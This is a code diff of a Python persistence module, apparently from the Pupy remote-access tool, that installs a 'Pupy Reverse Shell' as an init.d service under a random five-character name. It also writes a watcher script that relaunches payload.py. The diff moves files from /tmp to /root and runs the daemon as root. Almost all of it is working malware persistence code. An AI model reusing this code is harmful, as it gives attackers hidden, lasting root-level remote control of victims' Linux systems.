@@ -6,16 +6,16 @@ import string
 import threading
 import sys
 from subprocess import call
- 
- 
+
+
 class LinuxAutorun(threading.Thread):
- 
+
     def __init__(self, *args, **kwargs):
         self.original_wd = os.getcwd()
         self.random_alias_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase  + string.digits) for _ in range(5))
 
     def deamon_shell_code(self):
-        os.system("mv " + self.original_wd + "/payload.py /tmp/payload.py \n")
+        # os.system("mv " + self.original_wd + "/payload.py /root/payload.py \n")
         return ('#!/bin/sh\n'
                 '### BEGIN INIT INFO\n'
                 '# Provides:          Pupy Reverse Shell\n'
@@ -27,14 +27,14 @@ class LinuxAutorun(threading.Thread):
                 '# Description:       Enable service provided by daemon.\n'
                 '### END INIT INFO\n'
                 '\n'
-                'dir="/tmp/"\n'
+                'dir="/root/"\n'
                 'cmd="python watch.py"\n'
-                'user=""\n'
+                'user="root"\n'
                 '\n'
                 'name=`basename $0`\n'
                 'pid_file="/var/run/$name.pid"\n'
-                'stdout_log="/tmp/mshell.log"\n'
-                'stderr_log="/tmp/mshell..err"\n'
+                'stdout_log="/root/mshell.log"\n'
+                'stderr_log="/root/mshell..err"\n'
                 '\n'
                 'get_pid() {\n'
                 '    cat "$pid_file"\n'
@@ -122,7 +122,7 @@ class LinuxAutorun(threading.Thread):
                 'from subprocess import call\n'
                 '\n'
                 'def startShell():\n'
-                '    os.popen("/tmp/payload.py &")\n'
+                '    os.popen("/root/payload.py &")\n'
                 '    time.sleep(30)\n'
                 '\n'
                 'def stopShell():\n'
@@ -150,15 +150,15 @@ class LinuxAutorun(threading.Thread):
 
 
     def run(self):
-        if not os.path.isfile("/tmp/watch.py"):
+        if not os.path.isfile("/root/watch.py"):
                 code = self.watcher_code()
                 open("watch.py", 'w').write(code)
-                os.system("mv " + self.original_wd + "/watch.py /tmp/watch.py \n")
+                # os.system("mv " + self.original_wd + "/watch.py /root/watch.py \n")
                 code = self.deamon_shell_code()
                 self.deamon_script = os.path.join('/etc/init.d/', self.random_alias_name)
                 open(self.deamon_script, 'w').write(code)
                 print "Wrote deamon code to script", self.deamon_script
-                os.system("chmod 555 /tmp/payload.py\n")
+                os.system("chmod 555 /root/payload.py\n")
                 st = os.stat(self.deamon_script)
                 os.system("chmod +x /etc/init.d/" + self.random_alias_name + "\n")
                 os.chmod(self.deamon_script, st.st_mode | stat.S_IEXEC)
